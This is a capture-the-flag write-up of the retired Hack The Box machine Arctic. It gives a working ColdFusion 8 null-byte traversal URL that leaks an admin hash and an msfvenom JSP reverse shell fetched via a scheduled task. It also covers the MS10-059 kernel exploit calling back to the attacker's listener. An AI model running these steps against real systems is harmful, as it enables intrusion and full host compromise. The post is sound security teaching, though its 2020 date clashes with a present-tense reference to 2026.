---
layout: post
title: "The Server That Read Its Own Password Aloud"
subtitle: "HTB Arctic, where a decade-old ColdFusion install hands you its password through a hole in the floor, then a kernel that forgot to grow up hands you the rest"
date: 2020-05-26 12:00:00 +0000
description: "A null byte walks ColdFusion 8 back to its own password file, a scheduled task plants a shell, and an unpatched 2008 kernel does the rest."
image: /assets/og/the-server-that-read-its-own-password-aloud.png
tags: [hackthebox, writeup]
---

Arctic is a machine that stands very still and takes a long time to answer, and both of those things are the box telling you the truth about itself. The pages load slow because the Java engine underneath is ancient and tired. The version is ancient too, ColdFusion 8, old enough that its admin login will read its own password file back to you if you ask in the right broken way. So you ask. A null byte walks the server back up its own directory tree to the file where the admin hash lives, the internet cracks the hash in about a second, and you log in as the administrator of the thing. From there it is a short walk to a shell, and then the operating system underneath, a Windows Server 2008 with zero patches on it, falls over to a kernel bug from the same decade. Nothing here is clever. Arctic is a museum where none of the exhibits are behind glass.

```
        A R C T I C
        ===========
        login:  enter.cfm?locale=../../../ColdFusion8/lib/password.properties%00
                          |
                          v
        the null byte tells the parser "the path stops here,"
        and the server happily reads its own password aloud.

        crack the hash. log in. plant a task. catch the shell.
        then the kernel, unpatched since 2009, just opens.
                                                            氷
```

## 0x01 · the slow door

Three ports answer, and the gap between them is the first tell. A full TCP sweep finds RPC down low, one strange high port, and nothing in between.

```
# nmap -p- --min-rate 10000 10.10.10.11
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  msrpc
```

Port 8500 is the one that matters. That is the default port for JRun, the Java application server that Adobe ColdFusion rides on, and finding it open is like finding a building with the manufacturer's nameplate still bolted to the front. Browse to it and the directory listing hands you `CFIDE` and `cfdocs`, and under `CFIDE/administrator` sits a login panel that proudly announces itself as ColdFusion 8. Every page takes several seconds to render, which is not the network being slow. It is a heavy, dated runtime doing too much work on hardware that was modest in 2009. Hold that patience. The box rewards it twice.

## 0x02 · the null byte that walked home

ColdFusion 8 carries a directory traversal bug in the login page itself, and it is the kind of flaw you frame on a wall. The `locale` parameter on `enter.cfm` gets pasted into a file path with no checking, so you can feed it a path that climbs out of the web directory and points anywhere on disk. The trick that makes it land on this old Java stack is the null byte, `%00`, tacked onto the end.

Picture a filing clerk who has been told to fetch the document named on a card, and to always staple the suffix `.cfm` onto whatever you wrote before he goes looking. You want the raw password file, not a `.cfm` version of it, so you write the real path and then add a single invisible mark that means "the name ends here, ignore everything after." The clerk's eyes stop at the mark. The staple lands past it, on nothing. He walks off and brings back the real file. That invisible mark is the null byte, and the underlying Java string handling treats it as a hard end-of-string while the suffix gets appended harmlessly beyond it.

So you point the login page at ColdFusion's own stored credentials.

```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

The page renders its normal error, and buried in the source is the contents of `password.properties`, the admin hash sitting in plaintext on the page like a receipt left in a coat pocket.

```
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

Forty hex characters is a SHA-1 digest, and SHA-1 of a short human password is not a secret in any meaningful sense. Paste it into any lookup table and it falls instantly.

```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03  ->  happyday
```

The administrator password is `happyday`. The server never had to be broken into. It read its own credentials out loud because nobody taught the front door to stop reading at the edge of the building.

## 0x03 · a scheduled chore that fetches a shell

Log into `CFIDE/administrator` with that password and you are now the full administrator of the application, which on a ColdFusion box is most of the way to owning the host. There are two roads to a shell from here. The blunt one is an old unauthenticated FCKeditor upload bug that lets you drop a JSP straight into `userfiles/file/` and browse to it. The cleaner road, and the one that teaches more, uses a feature that was designed to be helpful.

ColdFusion's admin panel has a Scheduled Tasks section, meant for routine chores like pulling a report off a partner's server every night. The task can fetch a URL, and crucially it can save whatever it fetches to a file on disk. Think of it like leaving a standing order with the mailroom. Every day at this time, drive to this address, pick up whatever is there, and file it in this drawer. The mailroom never asks what is in the envelope. You just need a drawer that the web server will later run code out of.

So you stand up a JSP that calls back to your listener, then host it on a plain Python web server.

```
# build a jsp that connects back to my box
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f raw > iceberg.jsp
# the payload is [ a jsp reverse shell calling back to 10.10.14.4 on 443 ]
$ python3 -m http.server 80
```

In the panel, create a scheduled task whose URL points at `http://10.10.14.4/iceberg.jsp`, and whose save path drops the file inside the web root the admin panel already told you about, somewhere under `C:\ColdFusion8\wwwroot\CFIDE`. Run the task once by hand. ColdFusion drives out to your mailbox, picks up your JSP, and files it in a drawer the server will execute from. Start a listener and browse to the file.

```
# nc -lvnp 443
listening on [any] 443 ...
http://10.10.10.11:8500/CFIDE/iceberg.jsp     <- triggers it

connect to [10.10.14.4] from (UNKNOWN) [10.10.10.11]
C:\ColdFusion8\runtime\bin> whoami
arctic\tolis
```

You land as `arctic\tolis`, the unremarkable local user the ColdFusion service runs under. `user.txt` is sitting in his desktop.

```
C:\Users\tolis\Desktop> type user.txt
████████████████████████████████
```

## 0x04 · a kernel that never aged out

`tolis` is a nobody, so the question becomes what the operating system underneath has been ignoring. One command answers it, and the answer is breathtaking.

```
C:\> systeminfo
OS Name:        Microsoft Windows Server 2008 R2 Standard
OS Version:     6.1.7600 N/A Build 7600
Hotfix(s):      N/A
```

Build 7600 is the original 2009 release of Server 2008 R2, with no service pack and, per that last line, not a single hotfix ever applied. Picture a car that rolled off the lot in 2009 and has never once been back for service, not an oil change, not a recall, nothing. Every defect it shipped with is still in it. You do not need to find a subtle flaw. You need to look up which famous ones were never closed.

Feed the `systeminfo` output to a suggester that diffs it against Microsoft's patch history.

```
# windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo.txt
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services - Important
```

MS10-059, nicknamed Chimichurri, is a privilege escalation in a Windows service-tracing feature. The technical short version is that a low-privileged process can abuse the way that feature handles its work to get code running as `SYSTEM`. Think of it like a junior employee who finds that the building's after-hours cleaning crew runs with a master key and will run any task left on the schedule. Leave your task on their list and it gets done with the master key, not your office key. The exploit ships as a single Windows binary that takes your listener address and calls back already elevated.

Transfer the binary over, the usual ways being an SMB share or a quick download, and run it pointed at a second listener.

```
C:\Users\tolis\Downloads> .\iceberg-chim.exe 10.10.14.4 443

# on the catcher:
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.11]
C:\Windows\system32> whoami
nt authority\system
```

That is the top of the box. `root.txt` is in the administrator's desktop.

```
C:\Users\Administrator\Desktop> type root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is easy to file Arctic under "old, irrelevant, patch it and move on," and the two specific bugs are absolutely fixed. Nobody is shipping ColdFusion 8 in 2026, and MS10-059 was closed before some of the people reading this could read. But the shape of the box is not a fossil at all, and the shape is the lesson.

The traversal bug is the same confession every path-handling bug makes. A program took a piece of text from a stranger, treated it as a location instead of as inert data, and walked wherever it pointed. The null byte only worked because two layers disagreed about where a string ends, and disagreements about boundaries are where a frightening amount of security still lives. Swap the costume and this is the same family as the file-read bugs that leak source code and config out of modern apps every month.

The privilege escalation is the quieter scandal. There was no exploit needed to find the way up, only a machine that had never been patched. A kernel CVE is a date on a calendar, the most fixable thing in this entire writeup, killed forever by a reboot after an update. The vulnerability was not really MS10-059. It was a server that nobody had touched in years, still answering on the internet, still running the application as a user, still one lookup table away from total compromise. You cannot patch your way out of "nobody is looking after this." Patches fix the kernel. Only attention fixes neglect.

## 0x06 · outro

```
the front door read its own password to anyone who asked sideways.
the hash was a word, and the word was a chore on a calendar.
the chore fetched your shell. the kernel did the rest for free.

nothing here was forced. it was all just left unlocked and unwatched.

stop the string at the building's edge. patch the floor you stand on. wear black.

                                                            EOF
```

---

*HTB: Arctic, retired 19 May 2020. An easy Windows box that is really a lecture on neglect, a decade-old ColdFusion install and an unpatched kernel sharing the same costume. The null byte still walks home in a lab and nowhere you don't own.*